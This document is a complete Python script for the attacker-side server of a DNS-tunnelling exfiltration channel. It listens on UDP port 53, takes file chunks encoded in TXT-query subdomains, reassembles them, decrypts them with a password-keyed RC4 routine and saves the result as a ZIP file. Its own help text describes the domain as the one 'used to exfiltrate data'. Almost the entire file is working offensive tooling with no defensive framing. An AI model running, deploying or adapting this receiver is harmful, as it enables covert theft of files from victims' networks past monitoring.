#!/usr/bin/python3
# -*- coding: utf8 -*-
import argparse
import socket
from dnslib import *
from base64 import b64decode, b32decode
import sys

#======================================================================================================
#                                            HELPERS FUNCTIONS
#======================================================================================================

#------------------------------------------------------------------------
# Class providing RC4 encryption/decryption functions
#------------------------------------------------------------------------
class RC4:
    def __init__(self, key=None):
        self.state = list(range(256))  # initialization of the permutation table
        self.x = self.y = 0

        if key is not None:
            self.key = key
            self.init(key)

    # Key schedule
    def init(self, key):
        key = key.encode()  # Convert to bytes
        for i in range(256):
            self.x = (key[i % len(key)] + self.state[i] + self.x) & 0xFF
            self.state[i], self.state[self.x] = self.state[self.x], self.state[i]
        self.x = 0

    # Decrypt binary input data
    def binaryDecrypt(self, data):
        output = [None] * len(data)
        for i in range(len(data)):
            self.x = (self.x + 1) & 0xFF
            self.y = (self.state[self.x] + self.y) & 0xFF
            self.state[self.x], self.state[self.y] = self.state[self.y], self.state[self.x]
            output[i] = (data[i] ^ self.state[(self.state[self.x] + self.state[self.y]) & 0xFF])
        return bytearray(output)

#------------------------------------------------------------------------
def progress(count, total, status=''):
    """
    Print a progress bar - https://gist.github.com/vladignatyev/06860ec2040cb497f0f3
    """
    bar_len = 60
    filled_len = int(round(bar_len * count / float(total)))

    percents = round(100.0 * count / float(total), 1)
    bar = '=' * filled_len + '-' * (bar_len - filled_len)
    sys.stdout.write(f'[{bar}] {percents}%\t{status}\t\r')
    sys.stdout.flush()

#------------------------------------------------------------------------
def fromBase64URL(msg):
    msg = msg.replace('_', '/').replace('-', '+')
    return b64decode(msg + '=' * (-len(msg) % 4))

#------------------------------------------------------------------------
def fromBase32(msg):
    return b32decode(msg.upper() + '=' * (-len(msg) % 8))

#------------------------------------------------------------------------
def color(string, color=None):
    """
    Change text color for the Linux terminal.
    """
    attr = ['1']  # bold
    colors = {"red": '31', "green": '32', "blue": '34'}

    if color and color.lower() in colors:
        attr.append(colors[color.lower()])
        return f'\x1b[{";".join(attr)}m{string}\x1b[0m'
    else:
        prefixes = {"[!]": '31', "[+]": '32', "[?]": '33', "[*]": '34'}
        for prefix, code in prefixes.items():
            if string.strip().startswith(prefix):
                attr.append(code)
                return f'\x1b[{";".join(attr)}m{string}\x1b[0m'
        return string

#======================================================================================================
#                                            MAIN FUNCTION
#======================================================================================================
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--domain", help="The domain name used to exfiltrate data", dest="domainName", required=True)
    parser.add_argument("-p", "--password", help="The password used to encrypt/decrypt exfiltrated data", dest="password", required=True)
    args = parser.parse_args()

    # Setup a UDP server listening on port UDP 53    
    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udps.bind(('', 53))
    print(color("[*] DNS server listening on port 53"))
    
    try:
        useBase32 = False
        chunkIndex = 0
        fileData = ''
        
        while True:
            data, addr = udps.recvfrom(1024)
            request = DNSRecord.parse(data)
            
            if request.q.qtype == 16:
                qname = str(request.q.qname)
                
                if qname.upper().startswith("INIT."):
                    msgParts = qname.split(".")
                    msg = fromBase32(msgParts[1]).decode()
                    fileName, nbChunks = msg.split('|')
                    nbChunks = int(nbChunks)
                    
                    useBase32 = msgParts[2].upper() == "BASE32"
                    print(color("[+] Data was encoded using Base32" if useBase32 else "[+] Data was encoded using Base64URL"))
                    
                    fileData = ''
                    chunkIndex = 0
                    print(color(f"[+] Receiving file [{fileName}] as a ZIP file in [{nbChunks}] chunks"))
                    
                    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)    
                    reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("OK")))
                    udps.sendto(reply.pack(), addr)
                
                else:
                    msg = qname[:-len(args.domainName)-2]
                    chunkNumber, rawData = msg.split('.', 1)
                    chunkNumber = int(chunkNumber)
                    
                    if chunkNumber == chunkIndex:
                        fileData += rawData.replace('.', '')
                        chunkIndex += 1
                        progress(chunkIndex, nbChunks, "Receiving file")
                    
                    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                    reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(str(chunkNumber))))
                    udps.sendto(reply.pack(), addr)
                    
                    if chunkIndex == nbChunks:
                        print('\n')
                        try:
                            rc4Decryptor = RC4(args.password)
                            outputFileName = fileName + ".zip"
                            print(color(f"[+] Decrypting using password [{args.password}] and saving to output file [{outputFileName}]"))
                            with open(outputFileName, 'wb+') as fileHandle:
                                data = fromBase32(fileData) if useBase32 else fromBase64URL(fileData)
                                fileHandle.write(rc4Decryptor.binaryDecrypt(bytearray(data)))
                            print(color(f"[+] Output file [{outputFileName}] saved successfully"))
                        except IOError:
                            print(color(f"[!] Could not write file [{outputFileName}]"))
            else:
                reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                udps.sendto(reply.pack(), addr)
    except KeyboardInterrupt:
        pass
    finally:
        print(color("[!] Stopping DNS Server"))
        udps.close()
